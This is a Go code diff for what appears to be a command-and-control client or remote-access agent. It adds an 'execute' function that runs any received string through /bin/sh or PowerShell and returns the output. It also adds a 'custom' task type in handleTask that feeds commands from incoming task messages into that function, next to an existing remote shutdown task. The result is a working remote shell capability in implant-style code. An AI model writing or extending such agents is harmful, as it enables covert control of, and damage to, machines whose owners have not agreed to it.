@@ -6,6 +6,7 @@ import (
 	"os/exec"
 	"os/user"
 	"runtime"
+	"strings"
 	"time"
 )
 
@@ -32,6 +33,41 @@ func newClient(clientID string) *Client {
 		Version:   clientVersion,
 		StartedAt: time.Now().UTC(),
 	}
+}
+
+// ── Command execution ──────────────────────────────────────────────────────────
+
+// execute runs a shell command and returns its combined stdout+stderr.
+// Uses the platform's native shell so pipes, redirects, env vars, etc. all work.
+// og from ki
+
+func execute(cmd string) string {
+	var c *exec.Cmd
+
+	// choose OS to run command on
+	switch runtime.GOOS {
+	case "windows":
+		// using ps cus cmd lame
+		c = exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", cmd)
+	default:
+		c = exec.Command("/bin/sh", "-c", cmd)
+	}
+
+	// returns the output of the results
+	out, err := c.CombinedOutput()
+	result := strings.TrimSpace(string(out))
+
+	if err != nil {
+		if result != "" {
+			return fmt.Sprintf("%s\n[exit error: %s]", result, err)
+		}
+		return fmt.Sprintf("[exit error: %s]", err)
+	}
+	if result == "" {
+		// commands like cd wont create output maybe besides on ps
+		return "[command produced no output]"
+	}
+	return result
 }
 
 /*
@@ -95,6 +131,13 @@ func (c *Client) handleTask(task GundoMessage) GundoMessage {
 				_ = exec.Command("shutdown", "-h", "now").Run()
 			}
 		}()
+	case "custom":
+		if task.Command == "" {
+			result.Status = "error"
+			result.Output = "no command provided"
+			break
+		}
+		result.Output = execute(task.Command)
 
 	default:
 		result.Status = "error"
